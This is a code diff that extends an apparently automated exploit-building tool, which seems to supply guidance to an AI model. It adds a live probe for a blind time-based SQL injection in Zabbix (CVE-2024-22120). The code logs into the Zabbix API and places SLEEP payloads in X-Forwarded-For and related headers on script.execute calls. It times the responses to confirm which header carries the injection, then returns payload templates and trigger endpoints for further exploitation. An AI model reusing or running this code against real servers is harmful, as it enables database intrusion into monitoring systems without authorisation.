@@ -21248,6 +21248,86 @@ def _enumerate_access_inventory(ip, port, product=None, auth=None,
     return inv
 
 
+_IP_INJECTION_HEADERS = ("X-Forwarded-For", "X-Real-IP", "X-Client-IP",
+                         "True-Client-IP", "Forwarded", "X-Forwarded")
+
+
+def _probe_injection_vectors(ip, port, product, resolved=None, auth=None,
+                             session_cookie=None, timeout=25):
+    """REQUIRED precondition: before the refine loop, DERIVE + CONFIRM where a
+    blind-timing SQLi actually fires. The advisory names a field (e.g. Zabbix
+    'clientip') but that value is frequently taken from a REQUEST HEADER
+    (X-Forwarded-For), not a body param — the single assumption that sank 5
+    CVE-2024-22120 builds. Probe candidate carriers with a cheap SLEEP(0) vs
+    SLEEP(5) timing test and return the carrier(s) that actually delay.
+
+    Operator ask: "that is a key field that is required and should have been
+    checked before trying." Returns {confirmed:[{carrier,where,payload_template,
+    delta}], guidance}. Product-aware (Zabbix today); extend per app."""
+    import httpx as _hx, time as _t
+    prod_l = (product or "").lower()
+    resolved = resolved or {}
+    confirmed = []
+    # ── Zabbix: audit-log clientip sink, triggered on API script.execute ──
+    if "zabbix" in prod_l and auth and auth.get("username"):
+        base = f"http://{ip}:{port or 80}/api_jsonrpc.php"
+        H = {"Content-Type": "application/json-rpc"}
+        tok = None
+        for pk in ("username", "user"):
+            try:
+                r = _hx.post(base, json={"jsonrpc": "2.0", "method": "user.login",
+                                         "params": {pk: auth["username"],
+                                                    "password": auth.get("password")},
+                                         "id": 1}, headers=H, verify=False, timeout=timeout)
+                tok = (r.json() or {}).get("result")
+            except Exception:  # noqa: BLE001
+                tok = None
+            if tok:
+                break
+        if tok:
+            hid = (resolved.get("hostid") or ["10084"])[0]
+            scr = (resolved.get("scriptid") or ["1"])[0]
+
+            def _timed(header, sec):
+                hdrs = dict(H)
+                if header:
+                    hdrs[header] = f"127.0.0.1'-(SELECT SLEEP({sec}))-'"
+                t0 = _t.time()
+                try:
+                    _hx.post(base, json={"jsonrpc": "2.0", "method": "script.execute",
+                                         "params": {"scriptid": scr, "hostid": hid},
+                                         "auth": tok, "id": 1},
+                             headers=hdrs, verify=False, timeout=sec + 30)
+                except Exception:  # noqa: BLE001
+                    pass
+                return _t.time() - t0
+
+            for h in _IP_INJECTION_HEADERS:
+                try:
+                    b0 = _timed(h, 0)
+                    b5 = _timed(h, 5)
+                except Exception:  # noqa: BLE001
+                    continue
+                if (b5 - b0) >= 3.5:
+                    confirmed.append({"carrier": h, "where": "header",
+                                      "payload_template": "127.0.0.1'-(SELECT SLEEP({N}))-'",
+                                      "delta": round(b5 - b0, 1),
+                                      "endpoint": "/api_jsonrpc.php (script.execute) "
+                                                  "or /zabbix.php?action=script.execute"})
+                    break
+    bits = []
+    if confirmed:
+        c = confirmed[0]
+        bits.append(
+            f"INJECTION VECTOR CONFIRMED (probed live, NOT assumed): the blind "
+            f"time-based SQLi fires via the {c['carrier']} {c['where']} "
+            f"(observed +{c['delta']}s on SLEEP(5)). Put the payload in that "
+            f"{c['where']}, NOT in a body/query param. Payload template: "
+            f"{c['payload_template']} — replace {{N}} with the delay seconds. "
+            f"Trigger endpoint: {c['endpoint']}.")
+    return {"confirmed": confirmed, "guidance": "\n".join(bits)}
+
+
 def _enumerate_exploit_preconditions(ip, port, analysis, session_cookie=None,
                                       product=None, timeout=10, auth=None,
                                       access_inventory=None):
@@ -21423,8 +21503,34 @@ def _enumerate_exploit_preconditions(ip, port, analysis, session_cookie=None,
     except Exception as e:  # noqa: BLE001
         logging.debug("precondition enumeration failed: %s", e)
 
+    # ── INJECTION VECTOR — a REQUIRED precondition. For a blind-timing SQLi,
+    #    derive + PROBE where it actually fires (header vs body) BEFORE the loop,
+    #    instead of assuming the advisory's field name is a request parameter.
+    _vector_guidance = ""
+    if ("sql" in pre_blob) and any(k in pre_blob for k in (
+            "sleep", "time-based", "timing", "blind", "clientip",
+            "x-forwarded", "audit", "latency")):
+        try:
+            _iv = _probe_injection_vectors(ip, port, product, resolved=resolved,
+                                           auth=auth, session_cookie=session_cookie)
+            if _iv.get("confirmed"):
+                _c = _iv["confirmed"][0]
+                _vector_guidance = _iv["guidance"]
+                confirmed.append(f"injection vector: {_c['carrier']} {_c['where']} "
+                                 f"(probed live, +{_c['delta']}s)")
+                _record_confirmation(
+                    f"{ip}:{port or 80}", "injection_vector", _c["carrier"],
+                    "confirmed", evidence=f"blind-timing SQLi fires via {_c['carrier']} "
+                                          f"{_c['where']} (+{_c['delta']}s on SLEEP(5))",
+                    method="timing_probe", claim_value=f"{_c['where']}:{_c['carrier']}",
+                    product=product, cve=(analysis or {}).get("cve"))
+        except Exception as e:  # noqa: BLE001
+            logging.debug("injection-vector probe failed: %s", e)
+
     # Build guidance
     bits = []
+    if _vector_guidance:
+        bits.append(_vector_guidance)
     # KNOWN REQUEST CONTRACT — supply the product's request shape as fact so the
     # model doesn't guess it (anti-CSRF param name, token source, action
     # endpoint, injection param). Operator: "fields like this should be part of
